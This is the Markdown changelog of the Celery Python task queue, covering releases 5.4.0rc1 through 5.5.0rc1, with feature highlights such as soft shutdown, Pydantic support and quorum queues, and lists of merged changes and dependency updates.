changelog.md

---

# Change history

This document contains change notes for bugfix & new features in the main branch & 5.5.x series, please see \[whatsnew-5.5\](\#whatsnew-5.5) for an overview of what's new in Celery 5.5.

## 5.5.0rc1

  - release-date  
    2024-10-08

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Release Candidate 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

See \[whatsnew-5.5\](\#whatsnew-5.5) or read the main highlights below.

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Added Blacksmith.sh to the Sponsors section in the README (\#9323)
  - Revert "Added Blacksmith.sh to the Sponsors section in the README" (\#9324)
  - Added Blacksmith.sh to the Sponsors section in the README (\#9325)
  - Added missing " ” in README (\#9326)
  - Use Blacksmith SVG logo (\#9327)
  - Updated Blacksmith SVG logo (\#9328)
  - Revert "Updated Blacksmith SVG logo" (\#9329)
  - Update pymongo to 4.10.0 (\#9330)
  - Update pymongo to 4.10.1 (\#9332)
  - Update user guide to recommend delay\_on\_commit (\#9333)
  - Pin pre-commit to latest version 4.0.0 (Python 3.9+) (\#9334)
  - Update ephem to 4.1.6 (\#9336)
  - Updated Blacksmith SVG logo (\#9337)
  - Prepare for (pre) release: v5.5.0rc1 (\#9341)

## 5.5.0b4

  - release-date  
    2024-09-30

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 4 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

### Previous Pre-release Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Correct the error description in exception message when validate soft\_time\_limit (\#9246)
  - Update msgpack to 1.1.0 (\#9249)
  - chore(utils/time.py): rename <span class="title-ref">\_is\_ambigious</span> -\> <span class="title-ref">\_is\_ambiguous</span> (\#9248)
  - Reduced Smoke Tests to min/max supported python (3.8/3.12) (\#9252)
  - Update pytest to 8.3.3 (\#9253)
  - Update elasticsearch requirement from \<=8.15.0 to \<=8.15.1 (\#9255)
  - Update mongodb without deprecated <span class="title-ref">\[srv\]</span> extra requirement (\#9258)
  - blacksmith.sh: Migrate workflows to Blacksmith (\#9261)
  - Fixes \#9119: inject dispatch\_uid for retry-wrapped receivers (\#9247)
  - Run all smoke tests CI jobs together (\#9263)
  - Improve documentation on visibility timeout (\#9264)
  - Bump pytest-celery to 1.1.2 (\#9267)
  - Added missing "app.conf.visibility\_timeout" in smoke tests (\#9266)
  - Improved stability with t/smoke/tests/test\_consumer.py (\#9268)
  - Improved Redis container stability in the smoke tests (\#9271)
  - Disabled EXHAUST\_MEMORY tests in Smoke-tasks (\#9272)
  - Marked xfail for test\_reducing\_prefetch\_count with Redis - flaky test (\#9273)
  - Fixed pypy unit tests random failures in the CI (\#9275)
  - Fixed more pypy unit tests random failures in the CI (\#9278)
  - Fix Redis container from aborting randomly (\#9276)
  - Run Integration & Smoke CI tests together after unit tests pass (\#9280)
  - Added "loglevel verbose" to Redis containers in smoke tests (\#9282)
  - Fixed Redis error in the smoke tests: "Possible SECURITY ATTACK detected" (\#9284)
  - Refactored the smoke tests github workflow (\#9285)
  - Increased --reruns 3-\>4 in smoke tests (\#9286)
  - Improve stability of smoke tests (CI and Local) (\#9287)
  - Fixed Smoke tests CI "test-case" labels (specific instead of general) (\#9288)
  - Use assert\_log\_exists instead of wait\_for\_log in worker smoke tests (\#9290)
  - Optimized t/smoke/tests/test\_worker.py (\#9291)
  - Enable smoke tests dockers check before each test starts (\#9292)
  - Relaxed smoke tests flaky tests mechanism (\#9293)
  - Updated quorum queue detection to handle multiple broker instances (\#9294)
  - Non-lazy table creation for database backend (\#9228)
  - Pin pymongo to latest version 4.9 (\#9297)
  - Bump pymongo from 4.9 to 4.9.1 (\#9298)
  - Bump Kombu to v5.4.2 (\#9304)
  - Use rabbitmq:3 in stamping smoke tests (\#9307)
  - Bump pytest-celery to 1.1.3 (\#9308)
  - Added Python 3.13 Support (\#9309)
  - Add log when global qos is disabled (\#9296)
  - Added official release docs (whatsnew) for v5.5 (\#9312)
  - Enable Codespell autofix (\#9313)
  - Pydantic typehints: Fix optional, allow generics (\#9319)
  - Prepare for (pre) release: v5.5.0b4 (\#9322)

## 5.5.0b3

  - release-date  
    2024-09-08

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 3 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

### Previous Pre-release Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Added SQS (localstack) broker to canvas smoke tests (\#9179)
  - Pin elastic-transport to \<= latest version 8.15.0 (\#9182)
  - Update elasticsearch requirement from \<=8.14.0 to \<=8.15.0 (\#9186)
  - Improve formatting (\#9188)
  - Add basic helm chart for celery (\#9181)
  - Update kafka.rst (\#9194)
  - Update pytest-order to 1.3.0 (\#9198)
  - Update mypy to 1.11.2 (\#9206)
  - All added to routes (\#9204)
  - Fix typos discovered by codespell (\#9212)
  - Use tzdata extras with zoneinfo backports (\#8286)
  - Use <span class="title-ref">docker compose</span> in Contributing's doc build section (\#9219)
  - Failing test for issue \#9119 (\#9215)
  - Fix date\_done timezone issue (\#8385)
  - CI Fixes to smoke tests (\#9223)
  - Fix: passes current request context when pushing to request\_stack (\#9208)
  - Fix broken link in the Using RabbitMQ docs page (\#9226)
  - Added Soft Shutdown Mechanism (\#9213)
  - Added worker\_enable\_soft\_shutdown\_on\_idle (\#9231)
  - Bump cryptography from 43.0.0 to 43.0.1 (\#9233)
  - Added docs regarding the relevancy of soft shutdown and ETA tasks (\#9238)
  - Show broker\_connection\_retry\_on\_startup warning only if it evaluates as False (\#9227)
  - Fixed docker-docs CI failure (\#9240)
  - Added docker cleanup auto-fixture to improve smoke tests stability (\#9243)
  - print is not thread-safe, so should not be used in signal handler (\#9222)
  - Prepare for (pre) release: v5.5.0b3 (\#9244)

## 5.5.0b2

  - release-date  
    2024-08-06

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 2 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

### Previous Beta Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Bump pytest from 8.3.1 to 8.3.2 (\#9153)
  - Remove setuptools deprecated test command from setup.py (\#9159)
  - Pin pre-commit to latest version 3.8.0 from Python 3.9 (\#9156)
  - Bump mypy from 1.11.0 to 1.11.1 (\#9164)
  - Change "docker-compose" to "docker compose" in Makefile (\#9169)
  - update python versions and docker compose (\#9171)
  - Add support for Pydantic model validation/serialization (fixes \#8751) (\#9023)
  - Allow local dynamodb to be installed on another host than localhost (\#8965)
  - Terminate job implementation for gevent concurrency backend (\#9083)
  - Bump Kombu to v5.4.0 (\#9177)
  - Add check for soft\_time\_limit and time\_limit values (\#9173)
  - Prepare for (pre) release: v5.5.0b2 (\#9178)

## 5.5.0b1

  - release-date  
    2024-07-24

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the release-candidate for Kombu v5.4.0. This beta release has been upgraded to use the new Kombu RC version, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - (docs): use correct version celery v.5.4.x (\#8975)
  - Update mypy to 1.10.0 (\#8977)
  - Limit pymongo\<4.7 when Python \<= 3.10 due to breaking changes in 4.7 (\#8988)
  - Bump pytest from 8.1.1 to 8.2.0 (\#8987)
  - Update README to Include FastAPI in Framework Integration Section (\#8978)
  - Clarify return values of ...\_on\_commit methods (\#8984)
  - add kafka broker docs (\#8935)
  - Limit pymongo\<4.7 regardless of Python version (\#8999)
  - Update pymongo\[srv\] requirement from \<4.7,\>=4.0.2 to \>=4.0.2,\<4.8 (\#9000)
  - Update elasticsearch requirement from \<=8.13.0 to \<=8.13.1 (\#9004)
  - security: SecureSerializer: support generic low-level serializers (\#8982)
  - don't kill if pid same as file (\#8997) (\#8998)
  - Update cryptography to 42.0.6 (\#9005)
  - Bump cryptography from 42.0.6 to 42.0.7 (\#9009)
  - Added -vv to unit, integration and smoke tests (\#9014)
  - SecuritySerializer: ensure pack separator will not be conflicted with serialized fields (\#9010)
  - Update sphinx-click to 5.2.2 (\#9025)
  - Bump sphinx-click from 5.2.2 to 6.0.0 (\#9029)
  - Fix a typo to display the help message in first-steps-with-django (\#9036)
  - Pinned requests to v2.31.0 due to docker-py bug \#3256 (\#9039)
  - Fix certificate validity check (\#9037)
  - Revert "Pinned requests to v2.31.0 due to docker-py bug \#3256" (\#9043)
  - Bump pytest from 8.2.0 to 8.2.1 (\#9035)
  - Update elasticsearch requirement from \<=8.13.1 to \<=8.13.2 (\#9045)
  - Fix detection of custom task set as class attribute with Django (\#9038)
  - Update elastic-transport requirement from \<=8.13.0 to \<=8.13.1 (\#9050)
  - Bump pycouchdb from 1.14.2 to 1.16.0 (\#9052)
  - Update pytest to 8.2.2 (\#9060)
  - Bump cryptography from 42.0.7 to 42.0.8 (\#9061)
  - Update elasticsearch requirement from \<=8.13.2 to \<=8.14.0 (\#9069)
  - \[enhance feature\] Crontab schedule: allow using month names (\#9068)
  - Enhance tox environment: \[testenv:clean\] (\#9072)
  - Clarify docs about Reserve one task at a time (\#9073)
  - GCS docs fixes (\#9075)
  - Use hub.remove\_writer instead of hub.remove for write fds (\#4185) (\#9055)
  - Class method to process crontab string (\#9079)
  - Fixed smoke tests env bug when using integration tasks that rely on Redis (\#9090)
  - Bugfix - a task will run multiple times when chaining chains with groups (\#9021)
  - Bump mypy from 1.10.0 to 1.10.1 (\#9096)
  - Don't add a separator to global\_keyprefix if it already has one (\#9080)
  - Update pymongo\[srv\] requirement from \<4.8,\>=4.0.2 to \>=4.0.2,\<4.9 (\#9111)
  - Added missing import in examples for Django (\#9099)
  - Bump Kombu to v5.4.0rc1 (\#9117)
  - Removed skipping Redis in t/smoke/tests/test\_consumer.py tests (\#9118)
  - Update pytest-subtests to 0.13.0 (\#9120)
  - Increased smoke tests CI timeout (\#9122)
  - Bump Kombu to v5.4.0rc2 (\#9127)
  - Update zstandard to 0.23.0 (\#9129)
  - Update pytest-subtests to 0.13.1 (\#9130)
  - Changed retry to tenacity in smoke tests (\#9133)
  - Bump mypy from 1.10.1 to 1.11.0 (\#9135)
  - Update cryptography to 43.0.0 (\#9138)
  - Update pytest to 8.3.1 (\#9137)
  - Added support for Quorum Queues (\#9121)
  - Bump Kombu to v5.4.0rc3 (\#9139)
  - Cleanup in Changelog.rst (\#9141)
  - Update Django docs for CELERY\_CACHE\_BACKEND (\#9143)
  - Added missing docs to previous releases (\#9144)
  - Fixed a few documentation build warnings (\#9145)
  - docs(README): link invalid (\#9148)
  - Prepare for (pre) release: v5.5.0b1 (\#9146)

## 5.4.0

  - release-date  
    2024-04-17

  - release-by  
    Tomer Nosrati

Celery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally. This effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.

This release introduces two significant QA enhancements:

  - **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.
  - [Standalone Bug Report Script](https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html): The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.

Contrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning upon restarts and disconnections. Our initial attempts to resolve this were not successful (\#8796). With our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.

The rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.

### Changes

  - Add a Task class specialised for Django (\#8491)
  - Add Google Cloud Storage (GCS) backend (\#8868)
  - Added documentation to the smoke tests infra (\#8970)
  - Added a checklist item for using pytest-celery in a bug report (\#8971)
  - Bugfix: Missing id on chain (\#8798)
  - Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
  - Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
  - chore(ci): Enhance CI with <span class="title-ref">workflow\_dispatch</span> for targeted debugging and testing (\#8826)
  - Doc: Enhance "Testing with Celery" section (\#8955)
  - Docfix: pip install celery\[sqs\] -\> pip install "celery\[sqs\]" (\#8829)
  - Enable efficient <span class="title-ref">chord</span> when using dynamicdb as backend store (\#8783)
  - feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
  - Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
  - Fix recursive result parents on group in middle of chain (\#8903)
  - Fix typos and grammar (\#8915)
  - Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
  - Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (\#8937)
  - Make custom remote control commands available in CLI (\#8489)
  - Print safe\_say() to stdout for non-error flows (\#8919)
  - Support moto 5.0 (\#8838)
  - Update contributing guide to use ssh upstream url (\#8881)
  - Update optimizing.rst (\#8945)
  - Updated concurrency docs page. (\#8753)

### Dependencies Updates

  - Bump actions/setup-python from 4 to 5 (\#8701)
  - Bump codecov/codecov-action from 3 to 4 (\#8831)
  - Bump isort from 5.12.0 to 5.13.2 (\#8772)
  - Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
  - Bump mypy from 1.8.0 to 1.9.0 (\#8898)
  - Bump pre-commit to 3.6.1 (\#8839)
  - Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
  - Bump pytest from 8.0.2 to 8.1.1 (\#8901)
  - Bump pytest-celery to v1.0.0 (\#8962)
  - Bump pytest-cov to 5.0.0 (\#8924)
  - Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
  - Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
  - Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
  - Bump python-memcached from 1.59 to 1.61 (\#8776)
  - Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
  - Update cryptography to 42.0.5 (\#8869)
  - Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
  - Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
  - Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)

### Changes since 5.4.0rc2

  - Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
  - Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
  - Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (\#8937)
  - Bump pytest-celery to 1.0.0rc3 (\#8946)
  - Update optimizing.rst (\#8945)
  - Doc: Enhance "Testing with Celery" section (\#8955)
  - Bump pytest-celery to v1.0.0 (\#8962)
  - Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
  - Added documentation to the smoke tests infra (\#8970)
  - Added a checklist item for using pytest-celery in a bug report (\#8971)
  - Added changelog for v5.4.0 (\#8973)
  - Bump version: 5.4.0rc2 → 5.4.0 (\#8974)

## 5.4.0rc2

  - release-date  
    2024-03-27

  - release-by  
    Tomer Nosrati

<!-- end list -->

  - feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
  - Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
  - Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)
  - Update elasticsearch requirement from \<=8.11.1 to \<=8.12.0 (\#8810)
  - Update elastic-transport requirement from \<=8.11.0 to \<=8.12.0 (\#8811)
  - Update cryptography to 42.0.0 (\#8814)
  - Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
  - Update cryptography to 42.0.1 (\#8817)
  - Limit moto to \<5.0.0 until the breaking issues are fixed (\#8820)
  - Enable efficient <span class="title-ref">chord</span> when using dynamicdb as backend store (\#8783)
  - Add a Task class specialised for Django (\#8491)
  - Sync kombu versions in requirements and setup.cfg (\#8825)
  - chore(ci): Enhance CI with <span class="title-ref">workflow\_dispatch</span> for targeted debugging and testing (\#8826)
  - Update cryptography to 42.0.2 (\#8827)
  - Docfix: pip install celery\[sqs\] -\> pip install "celery\[sqs\]" (\#8829)
  - Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
  - Support moto 5.0 (\#8838)
  - Another fix for <span class="title-ref">link\_error</span> signatures being <span class="title-ref">dict\`s instead of \`Signature</span> s (\#8841)
  - Bump codecov/codecov-action from 3 to 4 (\#8831)
  - Upgrade from pytest-celery v1.0.0b1 -\> v1.0.0b2 (\#8843)
  - Bump pytest from 7.4.4 to 8.0.0 (\#8823)
  - Update pre-commit to 3.6.1 (\#8839)
  - Update cryptography to 42.0.3 (\#8854)
  - Bump pytest from 8.0.0 to 8.0.1 (\#8855)
  - Update cryptography to 42.0.4 (\#8864)
  - Update pytest to 8.0.2 (\#8870)
  - Update cryptography to 42.0.5 (\#8869)
  - Update elasticsearch requirement from \<=8.12.0 to \<=8.12.1 (\#8867)
  - Eliminate consecutive chords generated by group | task upgrade (\#8663)
  - Make custom remote control commands available in CLI (\#8489)
  - Add Google Cloud Storage (GCS) backend (\#8868)
  - Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
  - Update pytest to 8.1.0 (\#8886)
  - Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
  - Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
  - Bump mypy from 1.8.0 to 1.9.0 (\#8898)
  - Update pytest to 8.1.1 (\#8901)
  - Update contributing guide to use ssh upstream url (\#8881)
  - Fix recursive result parents on group in middle of chain (\#8903)
  - Bump pytest-celery to 1.0.0b4 (\#8899)
  - Adjusted smoke tests CI time limit (\#8907)
  - Update pytest-rerunfailures to 14.0 (\#8910)
  - Use the "all" extra for pytest-celery (\#8911)
  - Fix typos and grammar (\#8915)
  - Bump pytest-celery to 1.0.0rc1 (\#8918)
  - Print safe\_say() to stdout for non-error flows (\#8919)
  - Update pytest-cov to 5.0.0 (\#8924)
  - Bump pytest-celery to 1.0.0rc2 (\#8928)

## 5.4.0rc1

  - release-date  
    2024-01-17 7:00 P.M GMT+2

  - release-by  
    Tomer Nosrati

Celery v5.4 continues our effort to provide improved stability in production environments. The release candidate version is available for testing. The official release is planned for March-April 2024.

  - New Config: worker\_enable\_prefetch\_count\_reduction (\#8581)
  - Added "Serverless" section to Redis doc (redis.rst) (\#8640)
  - Upstash's Celery example repo link fix (\#8665)
  - Update mypy version (\#8679)
  - Update cryptography dependency to 41.0.7 (\#8690)
  - Add type annotations to celery/utils/nodenames.py (\#8667)
  - Issue 3426. Adding myself to the contributors. (\#8696)
  - Bump actions/setup-python from 4 to 5 (\#8701)
  - Fixed bug where chord.link\_error() throws an exception on a dict type errback object (\#8702)
  - Bump github/codeql-action from 2 to 3 (\#8725)
  - Fixed multiprocessing integration tests not running on Mac (\#8727)
  - Added make docker-docs (\#8729)
  - Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
  - Remove <span class="title-ref">new</span> adjective in docs (\#8743)
  - add type annotation to celery/utils/sysinfo.py (\#8747)
  - add type annotation to celery/utils/iso8601.py (\#8750)
  - Change type annotation to celery/utils/iso8601.py (\#8752)
  - Update test deps (\#8754)
  - Mark flaky: test\_asyncresult\_get\_cancels\_subscription() (\#8757)
  - change \_read\_as\_base64 (b64encode returns bytes) on celery/utils/term.py (\#8759)
  - Replace string concatenation with fstring on celery/utils/term.py (\#8760)
  - Add type annotation to celery/utils/term.py (\#8755)
  - Skipping test\_tasks::test\_task\_accepted (\#8761)
  - Updated concurrency docs page. (\#8753)
  - Changed pyup -\> dependabot for updating dependencies (\#8764)
  - Bump isort from 5.12.0 to 5.13.2 (\#8772)
  - Update elasticsearch requirement from \<=8.11.0 to \<=8.11.1 (\#8775)
  - Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
  - Bump python-memcached from 1.59 to 1.61 (\#8776)
  - Update elastic-transport requirement from \<=8.10.0 to \<=8.11.0 (\#8780)
